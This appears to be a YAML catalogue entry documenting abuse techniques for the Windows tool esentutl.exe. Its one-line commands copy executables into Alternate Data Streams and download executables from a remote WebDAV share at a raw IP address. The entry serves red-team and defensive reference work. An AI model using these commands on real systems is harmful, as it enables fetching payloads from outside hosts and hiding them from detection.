---
name: Esentutl.exe
description: 
functions:
  copy:
    - description: Copies the source VBS file to the destination VBS file.
      code: esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o
  ads:
    - description: Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.
      code: esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o
    - description: Copies the source Alternate Data Stream (ADS) to the destination EXE.
      code: esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o
    - description: Copies the source EXE to the destination Alternate Data Stream (ADS) of the destination file.
      code: esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.txt:file.exe /o
  download:  
    - description: Copies the source EXE to the destination EXE file.
      code: esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.exe /o
    - description: Copies the source EXE to the destination EXE file
      code: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
resources: 
    - resource: https://twitter.com/egre55/status/985994639202283520
fullpath: 
    - path: c:\windows\system32\esentutl.exe
    - path: c:\windows\sysWOW64\esentutl.exe
notes: Thanks to egre55 - @egre55
---